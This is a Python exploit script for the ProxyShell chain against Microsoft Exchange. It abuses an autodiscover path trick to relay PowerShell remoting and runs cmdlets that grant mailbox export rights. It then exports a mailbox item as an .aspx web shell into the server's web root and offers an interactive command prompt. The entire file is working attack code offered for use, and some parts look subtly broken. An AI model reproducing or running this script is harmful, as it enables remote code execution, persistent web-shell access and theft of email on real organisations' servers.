import random
import string
import requests
import re
import threading
import sys
import time
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from struct import *

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
	print("[+] Start wsman Server")

def rand_string(n=3):
    return 'ed'.join(random.choices(string.ascii_lowercase, k=n))

def rand_port(n=4):
    return ''.join(random.choices(string.digits, k=n))

p=int(rand_port())#start wsman random server port

class proxyshell:
	def __init__(self, exchange_url, email, verify=False):
		self.token
		self.email = email
		self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
		self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
		self.admin_sid = None
		self.legacydn = None
		self.rand_subj = rand_string(16)
		self.session = requests.Session()
		self.session.verify = verify

	def post(self,endpoint, data, headers={}):
		print("sending wsman")
		if 'powershell' in endpoint:
			path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp"
		else:
			path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}?&Email=autodiscover/autodiscover.json%3F@evil.corp"
		url = f'{self.exchange_url}{path}'
		r=requests.Session()
		r = r.post(
			url=url,
			data=data,
			headers=headers,
			verify=False
			)
		return r

class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()
        post_data = re.sub('<wsa:To>(.*?)</wsa:To>', '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>', '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)

        headers = {
            'Content-Type': content_type
        }

        r = self.proxyshell.post(
        	proxyshell,
            powershell_url,
            post_data,
            headers
        )
        resp = r.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(resp)

def start_server(proxyshell, port):

    handler = partial(PwnServer, proxyshell)
    server = ThreadedHTTPServer(('', port), handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

def shell(command, port):
    # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
    if command.lower() in ['exit', 'quit']:
        exit()
    wsman = WSMan("127.0.0.1", username='', password='', ssl=False, port=port, auth='basic', encryption='never')
    with RunspacePool(wsman) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        output = ps.invoke()

    print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
    print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))


def write_shell(url,user):
	webshell_name=rand_string()+".aspx"
	user1 = user.split('@')[0]
	shell_path=f'\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\{webshell_name}'
	shell(f'New-ManagementRoleAssignment -Role "Mailbox Import Export" -User "{user1}"', p)## Add "Mailbox Import Export
	time.sleep(3)
	shell('Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false', p) ## Remove-MailboxExportRequest clean Request
	time.sleep(3)
	shell(f'New-MailboxExportRequest -Mailbox {user} -IncludeFolders ("#Drafts#") -ContentFilter "(Subject -eq \'you are fucked\')" -ExcludeDumpster -FilePath "{shell_path}"', p)
	url=url+"/aspnet_client/"+webshell_name+"?cmd=Response.Write('eeeeeeeeeeeeeeeeeeeelUc1f3r11')"
	print("[+] Test shell.....")
	time.sleep(3)
	r=requests.get(url,verify=False,timeout=7)
	if('eeeeeeeeeeeeeeeeeeeelUc1f3r11' in r.text):
		print("[+] "+url+",shell is ok")
	elif('system.web' in r.text):
		print("[+] "+url+",shell write ok,But not Runing, Are you send webshell_mail?")
	else:
		print("[+] "+url+",shell write bad, maybe some antidefender on target!")

def start_cmdlet(url,token):
	pshell=proxyshell
	pshell.token=token
	pshell.exchange_url=url
	start_server(pshell, p)


if __name__ == '__main__':
	if len(sys.argv) > 2:
		url=sys.argv[1]
		user=sys.argv[2]
		token=sys.argv[3]
		start_cmdlet(url,token)
		try:
			if sys.argv[4] == "shell":
				write_shell(url,user)
		except:
			pass
	else:
		print("python https://xxx.com admin@example.com <token value> shell")
		exit()
	try:
		while True:
			command=input("Cmdlet:")
			shell(command,p)
	except:
		pass